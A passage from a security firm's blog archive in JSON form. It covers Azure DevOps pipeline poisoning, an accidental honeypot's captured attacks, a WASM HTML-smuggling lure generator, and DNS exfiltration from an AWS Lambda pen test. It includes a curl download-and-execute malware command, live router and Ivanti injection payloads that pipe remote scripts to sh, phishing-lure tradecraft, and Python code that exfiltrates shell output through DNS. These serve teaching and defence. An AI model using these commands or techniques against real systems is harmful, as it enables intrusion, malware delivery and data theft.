-d '\"' Download and execute malware, and sleep indefinitely to ensure the beacon is not killed. This is how you can maintain persistent access to an otherwise ephemeral box. # Fetch the payload from attackerinfra.com curl -k -X $'GET' \\ -H $'Host: attackerinfra.com' -H $'Sec-Ch-Ua: \\ \"Not A(Brand\\\";v=\\\"24\\\", \\\"Chromium\\\";v=\\\"110\\\"' -H $'Sec-Ch-Ua-Mobile: ?0' -H $'Upgrade-Insecure-Requests: 1' [...] -H $'Connection: close' \\ $'https://attackerinfra.com/MailDriverIntegration' \u003e /home/agentuser/MailDriverIntegration # Execute the malware chmod +x /home/agentuser/MailDriverIntegration sudo /home/agentuser/MailDriverIntegration \u0026 disown # Sleep indefinitely while [ 1 ]; do sleep 3; echo \"test\"; done; In the past, these commands and techniques have given us unfettered access to a plethora of information and data. At times, this was sensitive business data that could demonstrate that damage could be done even with non-dev accounts in the cloud, which are usually less protected for ease of access. Clearly, this is a reason to extend security best practices to all the departments in an organisation.\nThe man in the high castle By now you should hopefully have a decent amount of data, tokens and files to sift through (if not make sure you’ve looked through all accessible storage accounts). Some of the most juicy files you may find in DevOps environments are .tf files. These may be more common than you might expect as DevOps engineers and developers often make use of Terraform and Infrastructure as Code (IaC). If you come across these in your cloud red teaming engagement, you may have hit the jackpot.\nFor those not familiar with these files, they contain the configuration and state information for infrastructure managed by Terraform, a popular infrastructure as code (IaC) tool, often used in DevOps. Terraform uses these state files to keep track of the infrastructure it manages, ensuring that it can update or delete resources automatically. This data is crucial as it includes sensitive information such as configuration details, encryption keys, API keys, and possibly credentials that are needed to manage the infrastructure components.\nEssentially, these files are a blueprint of the entire infrastructure’s architecture and contain all the necessary details to replicate or manipulate the environment. The exploration of such cloud storage can lead to the retrieval of service account credentials used to push code to sometimes critical environments (i.e. production).\nOnce you are able to steal a higher privileged set of credentials (double points if it was a service principal), you can consider re-running the same techniques as mentioned before to access new and more critical assets.\nLeveraging the above techniques in client environments we have succeeded in completing attack paths that have led from non-technical staff being able to move laterally and escalate privileges all the way to being able to push code to the production CI/CD pipeline! This would effectively represent a significant vantage point and positioning for a malicious actor, who can carry out disruptive attacks that may halt business operations, deny services to employees and customers, exfiltrate valuable intellectual property and possibly wipe off or alter any data in Azure for extortion purposes.\nLessons learned The fascinating exploration of the cloud world and its wonders serves as a reminder to us all of the necessity of striking a balance between the convenience of cloud adoption and the critical need for robust security practices. Some observations and takeaways stemming from our experience are:\nIf possible, restrict commit history and code deployment logs read access to administrators only when using Azure DevOps.\nLimit code access in your pipeline to authorised devs only, who can read, write, pull, and push. Keeping an eye on access roles, especially for project manager accounts or non-techie accounts (usually lacking MFA, and generally less protected than devs’ accounts), is crucial for maintaining operational integrity and preventing abuses.\nImplement granular firewall and access control rules (RBAC) at the resource group level to:\nenforce strict separation of the SDLC environments.\nrestrict access to resources (storage accounts, key vaults, and databases) to only authorised users, machines and/or IP addresses.\nProtect your tfstate files as if they were passwords! Credentials and connection strings can easily lay in there!\nReview if service principals are adhering to the policy of least privileged access, even for seemingly benign ephemeral code checking agents.\nAlways consider defence-in-depth and integrating security to your DevOps processes and environments.\nIf you got here, thank you for reading and I hope this inspired you to look after your cloud DevOps environment a bit more thoroughly! :)"},"title":"Poisoning Pipelines: Azure DevOps Edition"},"/articles/2024/05/2024-05-16-adventures-and-accidental-honeypots-in-network-infrastructure-unravelling-internet-shenanigans/":{"data":{"":"","#":"","references#References:":"https://openwrt.org/docs/guide-user/luci/start\nhttps://www.greynoise.io/blog/active-exploitation-attempts-cve-2023-1389-against-tp-link-archer-gigabit-internet-routers\nhttps://www.zerodayinitiative.com/blog/2023/4/21/tp-link-wan-side-vulnerability-cve-2023-1389-added-to-the-mirai-botnet-arsenal\nhttps://answers.microsoft.com/en-us/windows/forum/all/ssdp-messages/ba8f36d0-6b4a-4735-84f9-db25e273c71f\nhttps://www.exploit-db.com/exploits/43414\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-21887\nhttps://developers.cloudflare.com/fundamentals/concepts/cloudflare-ip-addresses/","x17k5u4#\u003cimg src=\"images/x17K5U4.gif\" alt=\"x17K5U4\" title=\"x17K5U4\"\u003e":" welcome Hello World! So, I’ve been tinkering with network stuff lately, trying to set up some infrastructure.Turns out that in the process, I made a rookie mistake and left a few ports open to the internet! A few months down the line I took a look and to no one’s surprise my server had been bombarded with all sorts of requests. It was receiving a steady stream of traffic, but not the good kind…think of it more as a steady dose of “internet radiation”. Without realising it I had accidentally turned my server into a honeypot.\nSo, naturally curious I started digging into my server logs and what I found was equal parts fascinating and alarming. Let’s just say there’s a lot of shady stuff going on out there, from random bots on the site, directory traversal with known path (/.git/config wink wink), to common network appliance enumeration. You name it, they were trying it.\nBut here’s where things get interesting: Among all the noise, there are some requests that stand out. Like, seriously weird stuff. It’s like people are trying to target anything and everything they can get their hands on.\nSample 0:\nimage11 And sometimes they are nice enough to actually tell you who they are 🙂\nSample 1:\nimage12 From the looks of this particular request it’s already got some bash looking code in the payload. Let’s convert the URL encoding to make it more readable.\n/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(rm -rf *; cd /tmp; wget http://94.156.79.129/tenda.sh; chmod 777 tenda.sh; ./tenda.sh)\nThis resembles a command injection attack on OpenWRT routers running LuCI web interface (/cgi-bin/luci/). After a bit of googling, this actually targets routers vulnerable to CVE-2023-1389 as an initial step to breach the perimeter. Then proceed to download another bash script payload (tenda.sh), set it up and execute the script.\nUnfortunately, at the time of investigation, the hosted script is no longer available. But fear not, Google to the rescue! It looks like someone has already uploaded the script to any.run. This gives us an opportunity to dig deeper into what the attack is capable of.\nimage9 Content of tenda.sh script. image10 redtail binary packed with the late version of UPX 3.94. (3.94 released in 12th May 2017) Upon initial inspection, it looks like a script that contacts the C2 server and downloads then executes the payloads in various CPU architectures. Readers with a keen eye may have already spotted that this behaviour is highly similar to the propagation of the infamous Mirai botnet.\nHexdump functionality on any.run allows us to inspect the payload binary file, which gives us some hints to unpack the executable with UPX. Let’s grab the binary file and dissect it further locally (do this at your own risk, it is highly recommended to deal with malware in an isolated environment).\nimage7 UPX unpacking the binary like a charm. image6 Successfully using UPX to unpack the binary. Section headers are also restored. image16 Strings from the mips binary with references to further propagation of Mirai Botnet. image14 Strings from the mips binary with references to further propagation of Mirai Botnet. Luckily there are no anti-unpacking measures in place for the binary, and UPX has worked flawlessly to recover the original binary executable with all the section headers intact. Armed with the new information from the unpacked binary, it seems to be leveraging SSDP multicast packets to further identify devices on the network using DIAL protocol. The XML soap request seems to contain payload for further exploitation on vulnerable Huawei routers (CVE-2017-17215), which confirms the malware is attributed to Mirai botnet propagation.\nSample 2: image5 /api/v1/totp/user-backup-code/../../license/keys-status/;curl http://94.156.79.60/iv.sh | sh || wget -O- http://94.156.79.60/iv.sh | sh;\nNext up is this specimen. This request again resembles a command injection attack. However, this time it’s targeting the Ivanti Connect Secure web component vulnerable to CVE-2024-21887(/api/v1/totp/user-backup-code/), gaining a foothold and then downloading and executing the iv.sh script by piping it to sh(shell command interpreter).\nAgain, the hosted script was no longer available at the time of investigation. Fortunately, thanks to the amazing cyber community, someone has also uploaded the sample onto any.run for further analysis.\nimage4 Content of iv.sh script image1 1 redtail binary packed with the late version of UPX 4.23. Suggesting that the payload was generated fairly recently (4.2.3 released on 27th March 2024) image15 image13 image17 1 image2 Strings from the redtail binary with loads of reference to crypto mining operations Running this script will again contact the C2 server, downloading and executing a version of binary payload based on the CPU architecture of the compromised device. The name of the binary “redtail” might have given away the type of malware: Cryptominers!\nInspecting the strings after unpacking the binary also confirms this theory.\nSo, what have we learned? There is a lot of noise around the dangers of ports open to the internet when we are talking about cyber security. For some who have yet to open a port(s) and watch what happens this might seem a bit dramatic. However, your exposed services are constantly being targeted by all kinds of attacks! Remediating this issue is simple: place the web service behind some form of proxy or firewall, whether that be at the host, application or cloud level. I like Cloudflare proxy, and I ensure to whitelist the exposed ports to Cloudflare listed proxies IP addresses. Fun fact: you only need to do one of the 15 ranges listed on their website and it will work.\nUntil next time! Stay safe out there ;)\nx17K5U4 But also, here’s a list of more trivial ones that were picked up:\n[table id=5 /]"},"title":"Adventures and Accidental Honeypots in Network Infrastructure: Unravelling Internet Shenanigans"},"/articles/2024/05/2024-05-31-wasm-smuggling-for-initial-access-and-w-a-l-k-tool-release/":{"data":{"conclusions#Conclusions":"Although attacker-centric, this blogpost is intended to be a heads up for detection and response practitioners, but also to any defensive security researchers who feel the urge to dive into the intricacies of such a technique after reading this blog post.\nCurrent security controls do not yet seem capable of determining the IoCs and the heuristics involved, and so we are in need of additional detection and prevention mechanisms that can reduce the risk of malicious web assembly attacks.\nI really hope you enjoyed this article and will find my tool useful for your future red team engagements or to develop better defences and controls.\nSo long, and wish you the best of fun in your hacking journeys!","credit#Credit":"Credit where credit is due. This section is dedicated to give a big shout out to NetSPI for the initial research done into weaponising WASM for initial access as described in their article, linked here:\nThe Silk Wasm: Obfuscating HTML Smuggling with Web Assembly\nAnd another thank you to the researchers at delivr.to who have released an amazing research on how to build your WASM lure using Rust, which was used as a starting point for W.A.L.K. and really helped me understand this technique. You can find their research here:\nWebAssembly Smuggling: It WASM’t me","introduction#Introduction":" 8salmg ezgif.com crop TL;DR\nThis blog post introduces Web Assembly (WASM) as a powerful alternative to traditional web technologies, highlighting its appeal to cybersecurity professionals for evading security measures for initial access. WASM has been observed being leveraged in the wild as a new payload delivery avenue which can land payloads in a hardened email inbox or instant messaging chats. A new tool, W.A.L.K. (Web Assembly Lure Krafter), is released alongside this blogpost to automate the generation of payloads using Rust, bringing back HTML smuggling attacks and enhancing red teamers tradecraft.\nIntroductionEveryone is aware that the internet is powered by a plethora of platforms, services and technologies, but all the web content we see nowadays were fundamentally built using HTML, CSS and JavaScript. This has been the holy trinity of the web that allowed creative developers to build an amount of sites and content on the internet that cannot possibly be explored in the span of a lifetime, at least not in a non-automated fashion (and I guess I’m including the dark web too there).\nAt the same time not everyone is aware that a different way of building web pages has been available to developers and browsers for almost a decade, and this is called Web Assembly.\nWeb Assembly (also known as WASM) was released to the public for the first time in 2017. It has allowed internet wizards and obscure developers alike to simulate operating systems or play Doom (Doom 3 Demo) from within browsers (yes, it can play Doom!), opening the world wide web to a new way of building content that was once only reserved for compiled programming languages.\nWASM Win2000 Windows 2000 rendered in browser using Web Assembly (view). More projects can be found on madewithwebassembly.","resources#Resources:":" Link to W.A.L.K. (JUMPSEC Github): Github - W.A.L.K. Web Assembly Lure Krafter HTML Smuggling https://www.outflank.nl/blog/2018/08/14/html-smuggling-explained/ https://assume-breach.medium.com/home-grown-red-team-lnk-phishing-in-2023-revisited-again-2b8c885b9836 Web Assembly Smuggling Research https://www.netspi.com/blog/technical/adversary-simulation/obfuscating-html-smuggling-with-web-assembly/ https://blog.delivr.to/webassembly-smuggling-it-wasmt-me-648a62547ff4 Videos Modern Initial Access and Evasion Tactics: https://youtu.be/DyyD48iKsKE Desperate Infection Chains:https://youtu.be/CwNPP_Xfrts CTI https://www.crowdstrike.com/blog/ecriminals-increasingly-use-webassembly-to-hide-malware/ ","smuggling-payloads-using-walk#Smuggling Payloads using W.A.L.K.":"I was never a proficient developer (even more so for languages such as C or Rust) so I asked for some help from my favourite AI companion to better understand the concepts behind WASM smuggling. I started from this amazing article from deliver.to and managed to create a few web lures leveraging Rust, which inevitably led me to wanting to build a tool to automate the process. The above deliver.to’s article describes how attackers have been using Rust to recreate classic HTML smuggling techniques that get past the craziest email controls. Bonus - it also gives some nice templates coded in Rust!\nOn top of this, a CrowdStrike article also described how threat actors have been using this technique for a few years now (the article is from 2021) and together with NetSPI’s blog post on SilkWASM I felt like I had enough examples to start building towards executing this tactic and going through the process needed to generate lures to be weaponised for initial access.\nAt this point, we know that this technique is actively being used by malicious actors, it can circumvent traditional mail security controls and can be combined with obsolete and disused HTML smuggling techniques to perform older attacks in a modern fashion. Although bringing back Beef hooks may sound exciting, these were not very effective against modern browser sandboxing features. Yet attacks such as SVG Smuggling could be fruitful when built using WASM.\nThe process of creating a standalone WASM smuggling lure is somewhat tortuous if you are not a proficient Rust developer and I will purposefully skip the part where I tell you how to manually set one up. There is enough information on the internet to understand and guide you through this process. Nonetheless, allow me to introduce you to my new tool W.A.L.K. (Web Assembly Lure Krafter) which I developed to ease the above-mentioned process of building a standalone WASM payload smuggling lure.\nThe lure generated by the tool is based on prebuilt lure templates coded in Rust. It embeds payloads to smuggle through in a single HTML file which can then be sent in either instant messaging chats or via email attachments.\nW.A.L.K. can be found at the following Github repository:\nhttps://github.com/JumpsecLabs/WALK_WebAssembly_Lure_Krafter\nFollow through the repo’s README to set up your Rust environment and the relevant WASM libraries. Once done, navigate to the project’s root folder and simply run the tool from the command line using cargo run.\nWALK menu This will start W.A.L.K., presenting a menu with 3 lure templates to select from. The selection will be used to generate a template that embeds a custom payload and delivers it differently based on the lure selected.\nThe “Google Chrome Update” lure was designed to simulate a Google Chrome binary download motivated by a pretext such as “I.T. wants you to upgrade your version of Chrome”. The download button will trigger the download of the payload you embedded during the generation through W.A.L.K.\nNoPlaceLikeChrome The “One Drive File Download” template instead uses a lure based on the looks of Microsoft OneDrive. The lure generated off this template will trigger a file download 4 seconds after rendering the web page, simulating the delivery of files via a shareable OneDrive link.\nAs an example, this can be used with the pretext of wanting to provide HR (or a recruiter) with your resume and perhaps smuggle a payload through with it.\nWelcomeToOneDrive After the lure is selected, the program will guide through all the other options and values needed to build the HTML smuggling payload in Web Assembly. For example, the program will ask for the file extension to utilise for the downloaded payload, its location on the file system for the payload to be embedded as well as the file name shown for the file when downloading the payload.\nWALK output Once the lure is compiled, W.A.L.K. will show the relative file path of the generated lure. The file to smuggle consists of a standalone “index.html” file contained in the results folder of the project. Such index.html files can then be uploaded and sent via email or chat, effectively allowing your payload to be transported and smuggled through.\nThe above-mentioned lures, wrapped in a single HTML file, have been observed successfully landing in hardened corporate email inboxes, surprisingly circumventing any active controls that we are used to experiencing when dealing with email and instant messaging chats (e.g. spam filtering/classification, file AV scans), even when the message comes from standard non-corporate inboxes that present TLDs such as gmail.com, outlook.com, live.com, etc..\nRevieMyFiles The figure shows how the index.html file can be embedded into the email body to look more legitimate.\nOneDriveIsAGo For example, in this case both the email provider and OneDrive malware scans did not pick up the malicious contents of the file (called myFiles.html) and allowed the Download to happen from their platform.\nThe index.html file can then be sent in various ways and linked to your messages using a number of methods that may allow more or less number of clicks before the victim executes the contents of the smuggled payload. The reader is left with the arduous task of determining the best way to convey their smuggling lure to their victims and how many clicks their targets will need to go through before execution.\nAlthough not properly documented as of now, W.A.L.K. was designed for modularity. This means that it is possible to create more lure templates to expand the menu selection and allow new templates to be utilised with the tool. Despite not being documented yet, these capabilities are there and anyone interested can dive into the code in the repository to leverage this feature. There will eventually be a follow up blog post explaining how to create new Web Assembly lures in Rust and how to make them so that they can be used to expand W.A.L.K.’s lurebase.","what-is-wasm#What is WASM?":"WASM’s origins can be traced back to asm.js, a subset of JavaScript designed to facilitate the deployment of C and other demanding applications within web browsers. Recognising its potential, it was W3C that spearheaded it’s evolution into the open standard now known as Web Assembly. Web Assembly’s strengths lay in its core promise of speed and performance, far outpacing traditional JavaScript. It allows browsers to perform intensive computations with efficiency and stability, avoiding many of the pitfalls of JavaScript’s limitations.\nIt operates in two primary formats: a compact binary format for the browser’s Virtual Machine (VM) and an assembly-like textual format. While earlier technologies like Adobe’s Flash struggled with this, Web Assembly stands out, although it still remains under scrutiny for potential vulnerabilities. Importantly though, Web Assembly supports the seamless execution of code from multiple languages such as C, C++, Rust, and Go.","why-is-wasm-interesting-to-cybersecurity-folks#Why is WASM interesting to cybersecurity folks?":"You probably guessed it by now! As it is a lesser known alternative to build web content, it is also more interesting for threat actors that want to circumvent classic email filters and their security controls.\nFrom the red teaming perspective WASM presents features that can introduce malicious capabilities such as:\nRun malicious content within browsers.\nEvade traditional known-malicious JavaScript functions, like window.local.href (a property in JavaScript that gets or sets the URL of the current window, usually used to redirect the browser to a different URL) and window.navigator.msSaveOrOpenElob (typically used to download files from a web application, it allows for the saving or opening of a blob).\nBypass detection mechanisms typical of conventional file type signatures.\nConsider all of the mechanisms that browsers, web service providers, operating systems and security companies have developed and implemented over the years to identify, detect and alert against suspicious web pages that try to execute malicious code. Such defences have been mostly adapted to the malicious JavaScript and HTML tags that can be contained in a web page. So, what happens when instead we use Web Assembly to build a web page? We observe security controls becoming nearly non-existent when attempting to determine whether the web page is nefarious or legitimate.\nCombine WASM with techniques such as payload smuggling and you get a modern and stealthy initial access tactic that gets past modern email and instant messaging defences allowing your initial access to land in your target’s inbox unhindered!\nWhen I read about this I was way too excited not to dive into this evolved way of smuggling payloads and therefore, if you haven’t before, I’m honoured to introduce you to WASM smuggling and the tool I have built to automate payload generation."},"title":"WASM Smuggling for Initial Access and W.A.L.K. Tool Release"},"/articles/2024/06/2024-06-06-whats-in-a-name-writing-custom-dns-tunnelling-protocol-on-the-fly-exploiting-unexpected-aws-lambda-misconfiguration-all-in-a-web-app-pen-test-part-1/":{"data":{"":" half life hecu This is a war story of an AWS web application test where remote code execution was first obtained on the client’s application. Then I needed to write my own DNS tunnelling ‘protocol’ to get the data out. Following a number of twists and turns I impersonated the application and attempted to laterally move within the AWS tenant.\nBefore storytelling though, let’s start with a public service announcement:","oh-we-got-dns#Oh we got DNS!":" When life closes one door, look hard for native networking capabilities.\nGetting Data out from the UI was possible, but impractical. As an attacker in disguise, I felt strongly about my rights to get good user experience! My next step was to look for out-of-band data channels, the most obvious one being HTTP. There were 2 candidates to achieve this that I knew in the back of my head, the OS native curl util, and the urllib.request module in Python. I spun up my own listener on Burp Suite Collaborator, which listened on HTTP \u0026 DNS, and did a little request as shown here:\nurl = f'http://\u003cmy-subdomain\u003e.oastify.com' req_status = int(request.urlopen(url).status) pic4 To my surprise (and much joy indeed), though Burp Suite showed no HTTP request was received, the DNS query went through to the Name Server of oastify.com, which meant the Lambda was indeed talking back to us through DNS!\nExfil mechanism explained For those who are not familiar with the concept of DNS data exfiltration, it works like this - let’s say we control DNS records of oastify.com (in reality the PortSwigger company does). To run a server with IP a.b.c.d to receive data through that domain, one way is by becoming the Authoritative Nameserver for it. This can be done by creating an NS record for ns1.oastify.com and pointing it to a.b.c.d. If someone runs a DNS query against foobar.oastify.com, the name server a.b.c.d would receive that query. That’s the normal working part of DNS. The DNS records described in the paragraph can be written as:\noastify.com NS ns1.oaststify.com ns1.oastify.com A a.b.c.d If you were an attacker, you would want some juicy data to be sent to your server. How would you make this happen?\nThe vulnerable application in question would make the query: “Hey, internet, can I resolve \u003cjuicydata\u003e.oastify.com? \"\nAnd your nameserver at a.b.c.d would get the \u003cjuicydata\u003e inside the query, save it in its query log, and then feed the application some junk data:\n“Oh it’s b.c.d.e. Bye now!”\nTo properly PoC this feature, I used a native DNS util in Python called socket.gethostbyname().\nimport socket, os url = 'i-am-talking-to-you..oastify.com' url2 = f'{os.popen(\"/usr/bin/echo -n copy-that\").read()}..oastify.com' lookup1 = socket.gethostbyname(url1) lookup2 = socket.gethostbyname(url2) Below were queries Burp received when I replicated this part using my own Lambda function. It proved to me that 1. arbitrary subdomain query would also hit our malicous nameserver, and 2. you could put dynamic content (shell command output) in the subdomain and it would also go through AWS’s mechanisms to fire off that request.\npic5 pic6 This is a good place to stop for now in a 2-part post. Next time we will cover how this discovery could be weaponised to become a semi-interactive shell, how the Lambda’s identity was assumed by us and how the AWS remediation was found. Stay tuned!\nDisclaimer: most demonstrations below were recreated using my own AWS account and client details have been redacted for confidentiality.","tell-me-about-that-rce-you-got-there#Tell me about that RCE you got there":"In the past year or so, our adversary simulation team in JUMPSEC has been focusing heavily on the cloud red teaming scene. As a result, I had been on back to back adsim gigs and being assigned a web application pen test was a nice change of scenery.\nThe application in question was built for users of scientific and engineering backgrounds. An AWS Lambda-powered (think serverless function) feature in the app allowed users to submit Python code to perform calculations \u0026 simulations. The frontend UI would then display any number-typed results. For example, if a variable exists named “foobar” after the user supplied Python script ran to completion, and it was a number type at the end (INT, FLOAT, COMPLEX?), the frontend would display (if foobar == 1337):\nfoobar: 1337 However, non-numeric results would be dropped. During the test I found that any Python standard library was available in the environment.\nProving the RCE is alive and well Experienced app testers all have their favorite ways to execute OS commands in the major web programming languages, for example exec() in PHP, eval() in Node.js, and in Python my favorite is os.popen(). There are of course a couple others such as subprocess.run() and so on. Look it up if you are interested, on PayloadAllTheThings which is my go-to cheatsheet.\nAnyway, having standard Python libs meant we definitely have os , so the easiest proof for “working” RCE was just this:\nimport os output = int(os.popen('echo -n 1337').read()) And in the UI, voila, we see output: 1337.\nWell this ain’t much but it definitely pays the bills. I’d be a little hesitant to slap on the scary Critical Risk in the report without proving further impact at this point. Well, let’s make some coffee and expand our RCE’s capabilities.\nGetting more Data out Some more coffee-powered testing proved that our RCE was working well (I echoed some more numbers such as 42, 69420, etc). How though, would one make it more useful? Initially I preferred a solution that goes into the UI because it’s logical (KISS principle!) and also would look nice on the report. Since the Lambda only returned numbers and would not return any string, we needed a string-to-number encoding function.\nKnowing that Linux shell commands almost always produced ASCII strings, I wrote a little Python function that loops through the command output’s ASCII characters which encoded them into their respective ASCII numbers to form a big integer to be shown on the UI. We could then convert the result back to ASCII on our attacking machine. I double checked that all printable ASCIIs are between 0x0 and 0xFF (0-255). The app’s UI unfortunately could not output Hex, so we had to settle for transforming 1 ASCII char into a 3 digit number:\nFor example, ‘ABC’ was turned into 065066067. This was achieved with passing each character to ord(char) and adding a 0 to any output less than 100, before concatenating them into a single string, and running int() on the whole thing.\nIn the UI it would not have the leading 0, i.e. you would get 65066067068 instead, so the decoding function would need to add the 0 back if len(output) %% 3 != 0, split the string into 3-char chunks and put it through chr, which was the inverse of ord().\npic1 pic2 These two are the only “real” screenshots from the engagement, in case you are curious.\nThe screenshots showed the encoded output of whoami on the UI, which was decoded with a Python script. While this would also have been “good enough” (for context, sbx_userXYZ are the runtime users for Lambda), there was a glaring problem from an attacker’s perspective.\nIn Python’s standard libraries, the math (as far as I know) does not get as accurate as thousands of significant figures, and you would need that to get low thousands of bytes out from this encoding method, which isn’t a lot. That is probably the reason why the frontend did not give us more than 20 significant figures in the output. (From my limited knowledge, a 4-byte unsigned int in C goes to 4294967295 maximally, so that’s only 10 significant figures, or 3 “encoded bytes” in our very inefficient scheme).\nI did go into the rabbit hole of trying to dynamically generate named variables (var1, for the first 5 bytes; var2, for 6-10th bytes, and so on), but could not get far.","the-public-service-announcement#The Public Service Announcement":"As the title suggests, I discovered that it was possible to exfiltrate data from an AWS app through external DNS interaction. Interestingly, the disclosure surprised the client quite a bit because they thought it should not possible because, quote “all outbound TCP \u0026 UDP ports were blocked”. On further digging I discovered that this was indeed not enough to stop outbound DNS interactions.\nThe TL;DR is that, If you have an AWS Lambda app, or an EC2 instance that should not be making outbound connections (an “air-gapped cloud machine” that only talks to infrastructure owned by you), blocking all TCP \u0026 UDP ports through Security Groups \u0026 VPC Network Rules is not enough. Even if a 0.0.0.0/0 DENY rule is in place for port 53, you would need to additionally set up a Route 53 DNS firewall to block outbound DNS interactions. Part II of this blog post will include steps to set it up."},"title":"What's in a Name? Writing custom DNS tunnelling protocol, exploiting unexpected AWS Lambda misconfiguration - in a web app Pen test  (Part 1)"},"/articles/2024/06/2024-06-13-whats-in-a-name-writing-custom-dns-tunnelling-protocol-exploiting-unexpected-aws-lambda-misconfiguration-in-a-web-app-pen-test-part-2/":{"data":{"":"","#":" unnamed In Part 1 of the series we looked at how an AWS Lambda-powered feature was exploited in a web app penetration test initially leading to RCE and further on with out-of-band data exfiltration via DNS. Though the exact mechanism of achieving remote-code execution with Python was not discussed, we went in depth in how to return data as a result of the code being executed. Initially, with ascii-to-integer encoding I was able to find the username of the runtime user - sbx_userNNN.\nIn the first blog post, I spoke of the feature being powered by Lambda rather matter-of-factly, however during the penetration test, the “sbx_u” string was the first clue that the function I popped was powered by a Lambda.\nScreenshot showing decoding results of whoami:\npic1 1 pic2 1 After proving that RCE worked stably with limited data output in the application UI, I further discovered that although the app did not talk back via HTTP or HTTPS, it was making DNS requests to arbitrary domains. While BurpSuite’s Collaborator functionality was working fine for demonstrating proof-of-concept interactions, it presented a couple of problems as I went further:\npic8 Scalability \u0026 UX - I didn’t know at the time, but had vaguely remembered, that the exact data length limit of the DNS protocol was around 255 bytes total - need to RTFM (more detail on this later). But even at this point I knew I could not chuck thousands of bytes into a domain name and ask the poor Lambda to query for us. That meant we needed to split command outputs into multiple chunks at some point. Burp is written in Java and the UI (as seen above) would require manually clicking through hundreds of queries to copy and paste the data for further decoding. I needed a tool that either wrote each query to terminal or append to a file, that I could further decode and process.\nPrivacy \u0026 Cost - Honestly, avoiding manually clicking through hundreds of queries was a good enough reason to not proceed further in Burp. However, at that juncture my concerns also included privacy. If I proceeded further on this attack path, I would potentially be exfiltrating intellectual property of the client via the oastify.com domain, which was shared by all users of Burp Collaborator, including other pentesting providers and potentially cybercriminals. Not that I don’t trust PortSwigger as a company, but I don’t want to mess up some of the queries on my end and potentially send the encoded data to unknown entities.\nA final reason, which may not apply to us, but for those reading this article who are just starting out in Cyber - BurpSuite Collaborator is a paywalled feature and the annual enterprise licensing cost may be prohibitive for many hobbyists or learners.\nMoving the antenna to our own infrastructure So, is there a private, low-cost / free DNS interaction tool which outputs the log to either the terminal or a file, and works with a domain owned by us? Initially I had fleeting thoughts of spinning up a Bind9 DNS server on a VPS and use a couple of hacked-together shell scripts to do it, but then I thought, man, there are plenty of smart folks in my team who know either this tool or that tool off like the back of their hand, which would serve my specific purpose.\nI asked our techies for help. Initially our developer volunteered to adapt his custom DNS server written in Go for this purpose, but before we could see this big-brain moment through, he had other more pressing matters than pursuing this side quest (a failed motherboard I heard). Then another consultant introduced me to Interactsh, an open source tool maintained by ProjectDiscovery, designed to detect out-of-band (OOB) interactions. By default the oast.pro domain (I imagine owned by ProjectDiscovery) is used to catch queries, but one could buy a domain for a couple of bucks and tell the tool to point to it instead.\nAgain DNS can be quite complicated if you’re not that familiar with the protocol - so I’ll briefly explain how the tool works here:\n[vuln app] ---makes DNS query A----\u003e [server] # then [client] --ask for records of OOB-----\u003e [server] [client] \u003c--sends DNS query A details-- [server] In part 1 of this series I explained how DNS exfiltration works, so go to the relevant sections if you want a refresher on that. In the case of Interactsh, the “central server” maintained by ProjectDiscovery would resolve queries pointing towards subdomains of oast.pro. As a bug bounty hunter, you use the interactsh client to connect to the central interactsh server and be given a unique id. Any OOB interaction caught by the server, which matches your unique ID would be sent to your client and be displayed on your terminal. Screenshot below is from the README of the project, showing how the ID matching works.\npic9 In comparison, shown below is how I set Interactsh up for the engagement. As described in part 1, I needed a domain where we can edit NS and A records. Let’s say we own “awesome-blogpost.com” and I decided to use subdomains of “subdomain.awesome-blogpost.com” as the query catcher. I spun up a public facing VPS with a static IP address a.b.c.d, pointed the the NS record for the subdomain to it, much like the below (read part 1 if this doesn’t make much sense):\nSet an NS record for ns1.awesome-blogpost.com\npic10 So we first start our server on the publicly-facing VPS with domain specified and the server CLI would provide you have a client token, which is like a unique password for the client to connect to (says text in the screenshot because “text” was the actual subdomain I used in the engagement).\npic11 pic12 Then on my local machine, I connect to my server with with the client token and the -dns-only flag, and you can see a unique URL being provided as a OOB payload. If anything makes a DNS query to “cnson… .text.awesome-blogpost.com”, my server would catch it and show it to the client.\npic13 Encoding adventures - weird Python error \u0026 RTFM Before heading off to data encoding and the matter of writing a bootleg encoding protocol, let’s first address one thing - DNS is not meant for transmitting arbitrary length messages. I found out the hard way when trying to pipe /etc/passwd (pentester’s favorite!) through the wire - that Python complained of this (on my local testing script):\nTraceback (most recent call last): File \"/usr/lib/python3.10/encodings/idna.py\", line 163, in encode raise UnicodeError(\"label empty or too long\") UnicodeError: label empty or too long To replicate this at home, you can try to run this:\npython3 -c 'import socket; longname = \"A\" * 1000; req = socket.gethostbyname(f\"{longname}.example.com\")' What happened in that one command was Python being asked to do a DNS request for “AAAAA…(1000 of A’s)…AAA.example.com”. Searching for that error on Google landed me on a StackOverflow question where a dev encountered the same error. A knowledgeable user answered the question explaining that it was actually not a “Unicode error” but rather a DNS protocol error, implicating the cause being the subdomain within a DNS query being way too long, quote:\nIt seems this is an issue from the socket module. It fails when the URL’s hostname exceeds 64 characters.\nThis is still an open issue https://bugs.python.org/issue32958\nDigging deeper into the bug report linked, another user wrote, quote:\nThe error can be consistently reproduced when the first substring of the url hostname is greater than 64 characters long, as in “0123…..90123.example.com”. This wouldn’t be a problem, … so the entire “[user]:[secret]@XXX” section must be less than 65 characters long.\nDuring the pentest I took the explaination as is because 64-byte limit sounded right, though I actually limited my encoding to 60-byte in total for some imagined “leeway”. When writing this blog post, I read the RFC1035 for DNS to confirm this (and say I have RTFM’d) and discovered, on page 7, that:\nThe labels … must start with a letter, end with a letter or digit, and have as interior characters only letters, digits, and hyphen … Labels must be 63 characters or less.\nTurns out that those users were slightly wrong in that the maximum subdomain / hostname / label defined by the RFC was actually 63-bytes, not 64. You can verify this with tweaking the longname variable to 64 and 63 in the Python oneliner above. Knowing that the final messages will be maximally 63-byte chunks definitely helps.\nNext we need to think about other limitations of the DNS protocol. In the RFC we just referenced, it is also stated that a label must consist only of (case-insensitive) letters, digits and hyphen. With the input space (command output i.e. STDOUT) consisting of all printable Ascii, including symbols like %^@*#|/, space and newline, and the output space only consisting of letters, numbers and the unassuming hyphen -, it is clear that some sort of encoding scheme is needed.\nThe solution I came up with was the unassuming Base64 encode. Ideally you would want to encrypt the data with something like AES256 CBC as is the case for “production” C2 frameworks like Cobalt Strike, but we are dealing with a UAT build so let’s just roll with what we have.\nBefore dealing with the message length, lets see how I implemented the encoding with the code snippet below - first we read the command output for popen() and encode into UTF-8 (because b64encode takes a byte sequence), then the payload was Base64 encoded, gets back a string with decode(‘UTF-8’), and remove all the trailing = which might appear 